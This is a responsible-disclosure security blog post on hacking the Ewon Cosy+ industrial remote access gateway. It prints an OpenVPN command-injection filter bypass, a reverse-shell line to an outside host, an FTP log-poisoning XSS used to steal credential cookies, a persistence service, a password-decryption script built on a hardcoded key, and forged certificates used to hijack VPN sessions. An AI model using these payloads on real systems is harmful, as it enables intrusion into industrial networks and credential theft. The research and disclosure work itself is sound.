# Hacking a Secure Industrial Remote Access Gateway

Moritz Abrell

Aug 11
*2024-08-11T16:00:00+02:00*

25 min

In this blog post, we describe the security analysis and the found vulnerabilities in the industrial remote access solution Ewon Cosy+.

# TL;DR

We found security vulnerabilities in the [Cosy+](https://www.hms-networks.com/p/ec71330-00ma-ewon-cosy-ethernet) that allow unauthenticated attackers to gain root access to the device.
With this access and by conducting further analyses, we found more issues allowing decrypting encrypted firmware files and encrypted data such as passwords in configuration files.

Furthermore, we were able to get correctly signed X.509 VPN certificates for foreign devices.
This allows attackers hijacking VPN sessions which results in significant security risks against users of the [Cosy+](https://www.hms-networks.com/p/ec71330-00ma-ewon-cosy-ethernet) and the adjacent industrial infrastructure.

This research was also presented at [DEF CON 32](https://defcon.org/html/defcon-32/dc-32-speakers.html#54521).

# Introduction

Industrial VPN gateways play a crucial role in operational technology (OT) by enabling secure remote access to systems within industrial networks.
However, their importance goes hand in hand with increased security risks, as their architecture makes them lucrative targets for threat actors.
Over the years, we have seen such devices being used in various industrial environments, which underlines their widespread use in critical infrastructures.

Examples of such solutions are [Ewon](https://www.hms-networks.com/industrial-remote-access) devices by HMS.
Despite their widespread use, [highlighted vulnerabilities](https://www.pentestpartners.com/security-blog/ewon-flexy-iot-router-a-deep-dive/) in these devices emphasize the urgent need for robust security measures.
In light of the evolving threat landscape, the vendor has responded with the introduction of the [Cosy+](https://www.hms-networks.com/p/ec71330-00ma-ewon-cosy-ethernet), which has a new hardware base and an increased focus on [security](https://www.hms-networks.com/secure-remote-access).

Given these promises, conducting a security analysis of the [Cosy+](https://www.hms-networks.com/p/ec71330-00ma-ewon-cosy-ethernet) seems to be a good challenge, and we decided to take a closer look at the security posture of this device.

# Architecture

Many industrial remote access solutions operate by establishing a VPN connection between the router and a relay platform.
When technicians need to connect to the machines, they initiate another VPN connection to the relay platform from their client usually by using software provided by the vendor.
This same principle applies to the [Ewon Cosy+](https://www.hms-networks.com/p/ec71330-00ma-ewon-cosy-ethernet).

The [Ewon Cosy+](https://www.hms-networks.com/p/ec71330-00ma-ewon-cosy-ethernet) utilizes a VPN connection through OpenVPN to the Talk2m platform, which is hosted and maintained by the vendor.
Technicians can connect to devices based on their assignments using the Windows software [Ecatcher](https://www.hms-networks.com/ecatcher).
This software also establishes a VPN connection through OpenVPN.

This architecture can be abstracted as depicted in the following figure.

# Rooting the Device

Since encrypted drives and explicit hardware security are already promoted by the vendor and we did not want to destroy the device unintentionally in the first step,
we initially refrained from hardware-based attacks.
This means we would have to find vulnerabilities that allow us to learn more about the functionality of the [Cosy+](https://www.hms-networks.com/p/ec71330-00ma-ewon-cosy-ethernet).
The next most obvious approach would be to analyze the firmware.
But even here we won’t get any further, as firmware update files are encrypted (more on this in [firmware encryption](#firmware-encryption)).

Nevertheless, we found a vulnerability which allows rooting the device.

## OS command injection

Rooting the device was relatively easy since we found a simple OS command injection and filter bypass in user-provided OpenVPN configurations.

[Cosy+](https://www.hms-networks.com/p/ec71330-00ma-ewon-cosy-ethernet) allows uploading user-defined OpenVPN configuration files.
OpenVPN on the other hand allows executing user-defined scripts or commands, e.g. using the parameters `up` and `down` (see [OpenVPN manual](https://openvpn.net/community-resources/reference-manual-for-openvpn-2-5/)).

Wait, what? Can it be that simple?
Well, no.

The vendor implemented filter mechanisms trying to prevent using such parameters.

The following image shows the log entry of the prevented code execution through the OpenVPN configuration.

![Log entries showing forbidden OpenVPN configuration](data:image/gif;base64...)
*Log entries showing forbidden OpenVPN configuration*

As a next step, we tried bypassing the filter and finally were successful by prefixing the parameter with two dashes (`--up`), as the following example illustrates:

`| ``` 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22  ``` | ``` client dev tun persist-tun proto tcp remote device.vpn16.talk2m.com 443 verb 5 mute 20  --up '/bin/sh -c "id"' script-security 2  <ca> [...] </ca>  <cert> [...] </cert>  <key> [...] </key>  ``` |
| --- | --- |`

Uploading this OpenVPN configuration to the device resulted in code execution, which can be seen in the following image.

![Executed command shown in Cosy+ log](data:image/gif;base64...)
*Executed command shown in Cosy+ log*

Next, we adapted the OpenVPN configuration to get a reverse shell:

`| ``` 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22  ``` | ``` client dev tun persist-tun proto tcp remote device.vpn16.talk2m.com 443 verb 5 mute 20  --up '/bin/sh -c "TF=$(mktemp -u);mkfifo $TF;telnet 192.168.33.1 5000 0<$TF | sh >$TF 2>&1"' script-security 2  <ca> [...] </ca>  <cert> [...] </cert>  <key> [...] </key>  ``` |
| --- | --- |`

After uploading this configuration, we received a reverse shell, and due to the fact that OpenVPN is executed with `root` privileges, we finally rooted the device:

`| ``` 1 2 3 4 5 6 7  ``` | ``` $ nc -lvp 5000 Listening on 0.0.0.0 5000 Connection received on 192.168.33.194 40424 id uid=0(root) gid=0(root) groups=0(root) cat /etc/hostname ewon4  ``` |
| --- | --- |`
## Cross-site scripting

Since rooting the device requires administrative access to the [Cosy+](https://www.hms-networks.com/p/ec71330-00ma-ewon-cosy-ethernet), we looked for other vulnerabilities to get around this.

Eventually, we found a persistent cross-site scripting (XSS) vulnerability which can be triggered by unauthenticated attackers by log poisoning the FTP service.

The submitted username of an FTP authentication attempt is written to a log file which is then parsed and visible in the web interface of the device:

`| ``` 1  ``` | ``` $ ftp "<h1>SySS</h1>"@10.0.0.53  ``` |
| --- | --- |`

Due to missing input sanitization, HTML or JavaScript code can be injected this way, as the following figure illustrates.

![Cosy+ log containing submitted FTP username](data:image/gif;base64...)
*Cosy+ log containing submitted FTP username*

In addition, the [Cosy+](https://www.hms-networks.com/p/ec71330-00ma-ewon-cosy-ethernet) stores the Base64-encoded credentials of the current web session in the unprotected cookie named `credentials`:

![Accessing the credential cookie via XSS](data:image/gif;base64...)
*Accessing the credential cookie via XSS*

Therefore, attackers can leverage the XSS vulnerability to access the cookie, send it back to themselves, access the plaintext credentials, and finally gain administrative access to the device.

## Exploit chain

An unauthenticated attacker can gain `root` access to the [Cosy+](https://www.hms-networks.com/p/ec71330-00ma-ewon-cosy-ethernet) by combining the found vulnerabilities and e.g. waiting for an admin user to log in to the device.

This resulting exploit chain can be illustrated as follows:

![Exploit chain to root the Cosy+ from the perspective of an unauthenticated attacker](data:image/gif;base64...)
*Exploit chain to root the Cosy+ from the perspective of an unauthenticated attacker*

## Persistence

Our initial intention was to gain access to the device and conduct further analyses.

For having a more comfortable system access, we used the reverse shell access to deploy our own `systemd` service starting a statically linked `dropbear` SSH service using the the following configuration:

`| ``` 1 2 3 4 5 6 7 8 9 10 11 12  ``` | ``` [Unit] Description=ssh After=network.target  [Service] ExecStart=/usr/bin/dropbear -p 8022 -R Type=forking Restart=on-failure PIDFile=/var/run/dropbear.pid  [Install] WantedBy=multi-user.target  ``` |
| --- | --- |`

Finally, we are able to access the device via SSH as `root`:

`| ``` 1 2 3 4  ``` | ``` $ ssh -p 8022 root@10.0.0.53 root@10.0.0.53's password: root@ewon-2403-0999-25:~# id uid=0(root) gid=0(root) groups=0(root)  ``` |
| --- | --- |`
# Hardware Security Module

As described on the product website, the [Cosy+](https://www.hms-networks.com/p/ec71330-00ma-ewon-cosy-ethernet) uses a hardware security module (HSM) to ensure that secrets as well as providing cryptographic functionalities are kept secure.

The HSM is a `SE050A1` from NXP which is also known as [EdgeLock](https://www.nxp.com/products/security-and-authentication/authentication/edgelock-se050-plug-and-trust-secure-element-family-enhanced-iot-security-with-high-flexibility%3ASE050):

![SE050A1 HSM in the Cosy+](data:image/gif;base64...)
*SE050A1 HSM in the Cosy+*

In this section, we take a closer look at this HSM.

## Communication

According to an [application note](https://www.nxp.com/docs/en/application-note/AN13013.pdf) and to the [APDU specification](https://www.nxp.com/docs/en/application-note/AN12413.pdf#%5B%7B%22num%22%3A3060%2C%22gen%22%3A0%7D%2C%7B%22name%22%3A%22XYZ%22%7D%2C50%2C725.055%2Cnull%5D) of the SE050,
the I²C communication can be either secured and encrypted using the Secure Channel Protocol 03 (SCP03) or it is not protected at all.

Therefore, we first checked this by capturing the bus communication using a logic analyzer:

![Analyzing the I²C communication](data:image/gif;base64...)
*Analyzing the I²C communication*

![Positioning of the testing needles](data:image/gif;base64...)
*Positioning of the testing needles*

During this, we noticed that the communication is not secured and that we can see the APDU command structure, as demonstrated in the following figure:

![I²C communication and APDU command](data:image/gif;base64...)
*I²C communication and APDU command*

However, the payload itself seems not to be plaintext.
Thus, we cannot extract sensitive data by simply eavesdropping on the I²C communication.

## Static and dynamic analysis

Due to the payload encryption, we did further dynamic and static analyses of binaries communicating with the HSM.
This involved static analyses using [Ghidra](https://ghidra-sre.org/) and dynamic approaches using a statically linked [GDB](https://www.sourceware.org/gdb/) on the device itself:

![Excerpt of dynamic analysis of the I²C communication using GDB](data:image/gif;base64...)
*Excerpt of dynamic analysis of the I²C communication using GDB*

After some time, we gained better understanding of the secure communication which roughly works as follows:

1. The first 4 bytes from the unencrypted flash memory `/dev/mtd3` are read, and they represent the length of data to be read in the following step.
2. The determined length (in our case `0xa9` or `169` decimal) of data is read from the unencrypted flash memory `/dev/mtd3` starting from offset `0x03`.
3. The read data is decrypted using the Cryptographic Acceleration and Assurance Module (CAAM) of the i.MX6.
4. The decrypted data is used to derive and generate session-specific keys.
5. Finally, the data is encrypted using AES in CBC mode with a key length of 256 bit.

The following image illustrates the I²C payload encryption:

![I²C payload encryption overview](data:image/gif;base64...)
*I²C payload encryption overview*

**Note:** Since we analyzed a single device, we cannot verify if the content of `/dev/mtd3` and the keys used in CAAM differ between devices.
If not, this potential key reuse can be exploited by attackers with physical access to decrypt the I²C communication.

## Key access

Another interesting question is, if the secrets stored within the HSM can be accessed.

In order to answer this question, we used the [Plug and Trust middleware](https://github.com/NXP/plug-and-trust),
quickly developed a minimalistic tool to check the policy based on the provided examples, cross-compiled it on a compatible ARM-based system, and executed it on the [Cosy+](https://www.hms-networks.com/p/ec71330-00ma-ewon-cosy-ethernet).

For example, we tried accessing the secrets, for instance the ECC key with the ID `0xEF0000B0`.
However, read access was denied due to enabled policies and thus the keys cannot be extracted even with `root` access on the [Cosy+](https://www.hms-networks.com/p/ec71330-00ma-ewon-cosy-ethernet) device:

![Attempt to read the ECC private key](data:image/gif;base64...)
*Attempt to read the ECC private key*

# Back-End Communication

The communication between the [Cosy+](https://www.hms-networks.com/p/ec71330-00ma-ewon-cosy-ethernet) and the Talk2m API is done via HTTPS and secured via mutual TLS (mTLS) authentication.

The following image shows an exemplary capture of such an HTTPS communication.

![HTTPS communication between the Cosy+ and the Talk2m API secured by mTLS](data:image/gif;base64...)
*HTTPS communication between the Cosy+ and the Talk2m API secured by mTLS*

Since the [Cosy+](https://www.hms-networks.com/p/ec71330-00ma-ewon-cosy-ethernet) and the Talk2m are both enforcing X.509 certificate validation, we cannot simply access the plaintext communication.
Thus, we further analyzed the [Cosy+](https://www.hms-networks.com/p/ec71330-00ma-ewon-cosy-ethernet) and, for example, found the usage of the X.509 public key `/tmp/birth_key_crt.pem` and the ECC private key `/tmp/birth_key_ref.pem` within the binary `/usr/bin/ewon`, as the following figure illustrates:

![Client certificate and key passed to __xstat](data:image/gif;base64...)
*Client certificate and key passed to the function `\_\_xstat`*

However, while the public key looks fine, the ECC private key is mainly filled with `0x00` bytes, as the OpenSSL output shows:

`| ``` 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29  ``` | ``` $ openssl ec -in birth_key_ref.pem -text read EC key Private-Key: (521 bit) priv:     10:00:00:00:00:00:00:00:00:00:00:00:00:00:00:     00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:     00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:     00:00:00:00:00:00:00:ef:00:00:b0:a5:a6:b5:b6:     a5:a6:b5:b6:10:00 pub:     04:00:b6:0c:57:a0:8e:34:e7:24:2d:0c:8b:41:d2:     51:ab:bf:76:69:a1:1c:fc:f1:36:a4:57:91:8f:c1:     5b:f0:58:65:9a:ef:8f:9d:09:23:6b:4a:63:b0:ce:     4b:57:c8:68:31:9a:87:29:e0:e9:f8:7c:87:69:2f:     6e:a5:37:b1:ee:bf:db:01:53:c8:c6:5e:77:a9:1b:     d0:74:71:8c:4f:0f:f1:1b:10:b2:4d:06:d8:e6:25:     87:0e:51:80:38:bc:70:5e:85:b7:e7:a8:ef:ef:5d:     4a:ee:80:6b:3a:5b:c0:89:69:fe:5d:ef:ca:c7:c2:     01:c1:fa:33:24:16:c4:17:09:91:23:7c:bc ASN1 OID: secp521r1 NIST CURVE: P-521 writing EC key -----BEGIN EC PRIVATE KEY----- MIHcAgEBBEIQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA AAAAAAAAAAAAAAAA7wAAsKWmtbalprW2EACgBwYFK4EEACOhgYkDgYYABAC2DFeg jjTnJC0Mi0HSUau/dmmhHPzxNqRXkY/BW/BYZZrvj50JI2tKY7DOS1fIaDGahyng 6fh8h2kvbqU3se6/2wFTyMZed6kb0HRxjE8P8RsQsk0G2OYlhw5RgDi8cF6Ft+eo 7+9dSu6AazpbwIlp/l3vysfCAcH6MyQWxBcJkSN8vA== -----END EC PRIVATE KEY-----  ``` |
| --- | --- |`

This in turn results in cryptographic errors, e.g. when using it directly via OpenSSL or tools like cURL.

According to the HSM documentation, this is not the actual ECC private key. Instead, it is a so-called *reference key* which only contains the key ID and EC parameter.
In our case, the key ID is `0xEF0000B0`.

This reference key is required by OpenSSL, since it can only be used in combination with a syntactically correct key.
With a separate OpenSSL engine, which is defined in the OpenSSL configuration, all cryptographic operations concerning the key are then passed to the HSM.

For example, the following OpenSSL configuration can be used, and the corresponding environment variables can be exported to communicate with the Talk2m API:

`| ``` 1 2 3 4 5 6 7 8 9 10 11 12  ``` | ``` [nxp_engine] engines = engine_section  [ engine_section ] e4sss_se050 = e4sss_se050_section  [ e4sss_se050_section ] dynamic_path = /usr/lib/libsss_engine.so engine_id = e4sss init = 1  default_algorithms = EC  ``` |
| --- | --- |`
`| ``` 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35  ``` | ``` $ export OPENSSL_CONF=/etc/ssl/se050_openssl.cnf $ export EX_SSS_BOOT_SSS_PORT=/dev/i2c-0 $ curl -k -H $'Ewon-Serial: XXXX-XXXX-XX' -H $'Fwr-Version: 21.2s7' -H $'Device-State: New' https://device.talk2m.com/rest/endpoints --key /tmp/birth_key_ref.pem --cert /tmp/birth_key_crt.pem  App   :INFO :Using PortName='/dev/i2c-0' (ENV: EX_SSS_BOOT_SSS_PORT=/dev/i2c-0) sss   :INFO :atr (Len=35)       00 A0 00 00    03 96 04 03    E8 00 FE 02    0B 03 E8 08       01 00 00 00    00 64 00 00    0A 4A 43 4F    50 34 20 41       54 50 4F ssse-flw: No matching key in Secure Element.

| --- | --- |`

This complicated the analysis process, since we cannot export the actual private key and use it, for example with a TLS interception proxy.

In order to still find out which API endpoints are being addressed and how the corresponding requests look like,
we added our own X.509 certificate to the trust store `/usr/root/ewon/bin/deviceapi_castore.crt` which is hardcoded in the binary `/usr/bin/ewon`.
Afterwards, the HTTPS communication was redirected to our own HTTPS server, and we were able to see the requests initiated by the [Cosy+](https://www.hms-networks.com/p/ec71330-00ma-ewon-cosy-ethernet).

The following communication endpoints were observed:

`| ``` 1 2 3 4 5 6 7 8 9 10 11  ``` | ``` https://device.talk2m.com/certificates https://device.talk2m.com/certificates/csr https://device.talk2m.com/certificates/csrOptions https://device.talk2m.com/certificates/deviceCertificate https://device.talk2m.com/information https://device.talk2m.com/registration https://device.talk2m.com/registration/accountCredentials https://device.talk2m.com/rest https://device.talk2m.com/rest/endpoints https://device.talk2m.com/tunnels https://device.talk2m.com/tunnels/endpoints  ``` |
| --- | --- |`

Finally, we were able to intercept the HTTPS communication and to communicate with the Talk2m platform from the device itself.
**Note:** The security analysis was limited to the device itself. Tests against the services hosted by the manufacturer were not carried out or only in consultation with HMS.

# Firmware Encryption

Firmware update packages can be downloaded from the [manufacturer’s support website](https://www.hms-networks.com/p/ec71330-00ma-ewon-cosy-ethernet?tab=tab-support).
As assumed, however, the firmware is encrypted, except a header part. This is illustrated by the following output:

While analyzing the update process on the device, we were able to determine the firmware structure and the parsing and decryption process which was as follows:

1. The script `ewon_update` reads a key ID at offset `0x64` of the firmware.
2. A 256-bit-encrypted AES key is read from offset `0x68`.
3. An IV is read from offset `0x88`.
4. The binary `/usr/bin/se050_tool` is used to decrypt the encrypted AES key:
   * `se050_tool` passes the encrypted AES key to the HSM.
   * The HSM decrypts the AES key and returns it.
   * The decrypted 256-bit AES key is written to a file.
5. An offset of an encrypted firmware parser script is determined by `ewon_update`.
6. The encrypted script is decrypted using the decrypted AES key and IV using AES in CBC mode and written to a file.
7. The parser script reads the firmware structure and decrypts the different file systems and partitions using the decrypted AES key and IV.
8. The decrypted file systems and partitions are used to proceed with the update process.

The following image illustrates the firmware encryption:

![Firmware encryption overview](data:image/gif;base64...)
*Firmware encryption overview*

As a result, the encrypted key of a firmware update file can only be decrypted with root access to a [Cosy+](https://www.hms-networks.com/p/ec71330-00ma-ewon-cosy-ethernet).
Nevertheless, this does not prevent leaking firmware-specific encryption keys.

For example, we decrypted the AES key by passing it to the HSM of our rooted device and finally used it to decrypt the corresponding firmware update file:

`| ``` 1 2 3 4 5 6 7 8 9 10 11 12  ``` | ``` # Decrypted AES key: $ xxd decrypted-key 00000000: 6020 b954 6010 d2f9 5fb9 3abd 4960 39d6  ` .T`..._.:.I`9. 00000010: #### #### #### #### #### #### #### ####  ################  # MD5 sum of a decrypted filesystem found in the firmware: $ md5sum dm-3 0d5d5fb2e3564e70aa3c556d7758e2fc  dm-3  # Decrypted EXT4 file system: $ file dm-3 dm-3: Linux rev 1.0 ext4 filesystem data, UUID=0ad86007-e34b-4d08-8c1a-e1907661cbe5, volume name "otaroot" (extents) (64bit) (large files) (huge files)  ``` |
| --- | --- |`

In addition to the firmware encryption, update files are signed and also verified by the HSM,
which prevents updating the [Cosy+](https://www.hms-networks.com/p/ec71330-00ma-ewon-cosy-ethernet) using manipulated firmware files.

# Password Encryption

The Cosy+ stores secrets such as passwords in configuration and backup files in an encrypted format.

The following output shows a sample configuration containing an encrypted password:

`| ``` 1 2 3 4 5 6 7 8 9 10  ``` | ``` EthIP:10.0.0.53 EthMask:255.255.255.0 EthGW:192.168.33.1 [...] DefAdmPass:#_5_iuWbFOM6NtpH4i5XOOJW+BJA [...] LANDHCPSLeaseTime:3600 IcxModemConnectivityType:0 ModemWanAdapterMTU:0 LANDHCPSFilter:0  ``` |
| --- | --- |`

It clearly looks like the first four characters `#_5_` are something like a prefix and then followed by a Base64-encoded string.
When decoding the string, it becomes clear that this must be an encryption or some kind of obfuscation:

`| ``` 1 2 3  ``` | ``` $ echo -n "iuWbFOM6NtpH4i5XOOJW+BJA" | base64 -d | xxd 00000000: 8ae5 9b14 e33a 36da 47e2 2e57 38e2 56f8  .....:6.G..W8.V. 00000010: 1240                                     .@  ``` |
| --- | --- |`

In previous versions of Ewon products, a simple [XOR encryption](https://www.pentestpartners.com/security-blog/ewon-flexy-iot-router-a-deep-dive/#decrypt) was used.
However, this does not apply to newer versions and to our passwords.

Therefore, we first grepped for the usage of the prefix `#_5_` in the firmware and found it in the ARM executable `/usr/bin/ewon`.

Analyzing the binary with [Ghidra](https://ghidra-sre.org/) and reconstructing both the encryption algorithm and the utilized keys was relatively straightforward due to the usage of well-known OpenSSL functions.
Consequently, we were able to simply trace back the usage of the prefix and identify the functions responsible for the encryption process.

The following functions show the password encryption within the binary, whereas the AES key and IV is read from the `.rodata` section of the binary.

![Password encryption functions (note: function, variable and pointer names were changed)](data:image/gif;base64...)
*Password encryption functions (note: function, variable and pointer names were changed)*

Finally, passwords can be decrypted using the following Python script including the key and IV from offset `0x2ce810` and `0x2ce800` found in the binary:

`| ``` 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28  ``` | ``` import base64 import sys from Crypto.Cipher import AES from binascii import unhexlify   def pad(text):     padding_length = AES.block_size - (len(text) % AES.block_size)     padded_text = text + bytes([padding_length] * padding_length)     return padded_text, padding_length   encoded_text = sys.argv[1]  key_hex = "6367[...]" iv_hex =  "28c9[...]"  key = unhexlify(key_hex) iv = unhexlify(iv_hex)  decoded_text = base64.b64decode(encoded_text[4:]) padded_text, padding_length = pad(decoded_text) cipher = AES.new(key, AES.MODE_CBC, iv) decrypted_text = cipher.decrypt(padded_text)  print("Plaintext: {}".format(     decrypted_text[1:][:-padding_length-2].decode('utf-8')     ))  ``` |
| --- | --- |`

A successful decryption of the sample password is shown in the following output:

`| ``` 1 2  ``` | ``` $ python3 decrypt_ewon_pwd.py "#_5_iuWbFOM6NtpH4i5XOOJW+BJA" Plaintext: Password123#  ``` |
| --- | --- |`

Surprisingly, the [Cosy+](https://www.hms-networks.com/p/ec71330-00ma-ewon-cosy-ethernet) employs a hardcoded key stored within the binary for password encryption, rather than utilizing the HSM, like it is done for firmware encryption.
This in turn allows decrypting secrets without access to a rooted device.

# OpenVPN X.509 Device Certificate

If a [Cosy+](https://www.hms-networks.com/p/ec71330-00ma-ewon-cosy-ethernet) device is assigned to a Talk2m account, the device generates a certificate signing request (CSR) containing its serial number as common name (CN) and sends it to the Talk2m API:

`| ``` 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15  ``` | ``` POST /certificates/csr HTTP/1.1 Host: eu.device.talk2m.com Accept: application/json Content-Type: application/json Ewon-Serial: XXXX-XXXX-XX Accept-Language: en Fwr-Version: 21.2s7 Device-State: AccountLinked Content-Length: 776 Connection: close  {     "csr":  "-----BEGIN NEW CERTIFICATE REQUEST-----\nMIIB6zCC[...] kWInsCPhDoKd1f\n-----END NEW CERTIFICATE REQUEST-----\n" }  ``` |
| --- | --- |`

Afterwards, the signed certificate can be accessed via the Talk2m API by the device:

`| ``` 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15  ``` | ``` $ curl -k -H $'Ewon-Serial: XXXX-XXXX-XX' \ -H $'Fwr-Version: 21.2s7' -H $'Device-State: AccountLinked' \ https://device.talk2m.com/certificates/deviceCertificate \ --key /tmp/birth_key_ref.pem --cert /tmp/birth_key_crt.pem   HTTP/1.1 200 date: Wed, 17 Apr 2024 11:46:53 GMT server: Apache ewon-server-time: 1713354414 device-state: VpnProvisioned connection: close  {"certificate":"-----BEGIN CERTIFICATE-----\nMIIDTjCC[...] sxyR8w==\n-----END CERTIFICATE-----"}  ``` |
| --- | --- |`

This certificate is then used for OpenVPN authentication, as shown in the resulting OpenVPN configuration found on the device:

`| ``` 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53  ``` | ``` suppress-timestamps remote-cert-tls server reneg-sec 86400 client tls-exit rport 443 verb 1 mute 30 script-security 2 comp-lzo persist-key up-delay route-delay 0 dev tap0 lladdr 00:03:27:d8:68:84 greip_lanitf lanbr0 greip_local 3.14.15.92 gremac_local 00:03:27:d8:68:85 gre_lanmac 00:03:27:58:68:85 gre_lanip 10.0.0.53 proto tcp nobind keepalive 30 120 hand-window 140 remote 51.195.79.69 resolv-retry 60 tls-version-min 1.2 tls-cipher TLSv1.2:!AES128:!ARIA128:!CAMELLIA128:!MD5:!eNULL:!PSK3 cipher AES-256-GCM remap-usr1 SIGTERM  <ca> -----BEGIN CERTIFICATE----- [...] -----END CERTIFICATE----- -----BEGIN CERTIFICATE----- [...] -----END CERTIFICATE----- </ca>  <cert> -----BEGIN CERTIFICATE----- MIIDTjCC [...] sxyR8w== -----END CERTIFICATE----- </cert>  <key> -----BEGIN PRIVATE KEY----- [...] -----END PRIVATE KEY----- </key>  ``` |
| --- | --- |`

However, there is no other indicator than the device’s serial number in the common name of the certificate to differentiate the VPN session in order to assign the session to the corresponding Talk2m account.
Therefore, we tried to enroll our own CSR with a CN (serial number) of another (foreign) device to check for potential security issues.

Afterwards, our CSR containing a foreign serial number was signed by the manufacturer certificate authority (CA) `Talk2M VPN Device CA_202306121033`:

![Correctly signed X.509 certificate containing a foreign device serial number](data:image/gif;base64...)
*Correctly signed X.509 certificate containing a foreign device serial number*

**Note:** The shown serial number `D2307-0101-25` was provided by HMS to verify and prove the security vulnerability.

By using this certificate and the corresponding key for OpenVPN authentication, we were able to successfully initiate a VPN session, as the following figure illustrates:

![OpenVPN session using a foreign Cosy+ certificate](data:image/gif;base64...)
*OpenVPN session using a foreign Cosy+ certificate*

Finally, our connection overwrote the original one with the given device’s serial number, and we successfully took over the OpenVPN session.

This circumstance results in several security risks:

* The original VPN session will be overwritten, and thus the original device is not accessible anymore.
* If Talk2m users connect to the device using the VPN client software [Ecatcher](https://www.hms-networks.com/ecatcher), they will be forwarded to the attacker.
  This allows attackers to conduct further attacks against the used client, for example accessing network services such as RDP or SMB of the victim client.
  The fact that the tunnel connection itself is not restricted favors this attack.
* Since the network communication is forwarded to the attacker, the original network and systems could be imitated in order to intercept the victim’s user input such as the uploaded PLC programs or similar.

An illustration of such an attack is shown below:

# Conclusion

We found multiple security vulnerabilities in the [Ewon Cosy+](https://www.hms-networks.com/p/ec71330-00ma-ewon-cosy-ethernet) which allow fully compromising the device.
Furthermore, we were able to analyze and comprehend several cryptographic operations such as firmware and password decryption, or secure communication to the Talk2m platform.
Ultimately, a security vulnerability in the device assignment could be exploited to take over OpenVPN sessions of foreign devices resulting in major security risks.

The following table provides an overview of the found security vulnerabilities.

As a result of our responsible disclosure of these security issues, the manufacturer provided the patched firmware versions `21.2s10` and `22.1s3`.
We recommend updating [Cosy+](https://www.hms-networks.com/p/ec71330-00ma-ewon-cosy-ethernet) devices according to the [manufacturer note](https://hmsnetworks.blob.core.windows.net/nlw/docs/default-source/products/cybersecurity/security-advisory/hms-security-advisory-2024-07-29-001--ewon-several-cosy--vulnerabilities.pdf) as soon as possible.

The improper authentication for certificate signing was fixed by the manufacturer immediately after we reported the issue.

We would like to point out that the cooperation with the manufacturer HMS during the responsible disclosure process was excellent and exemplary.
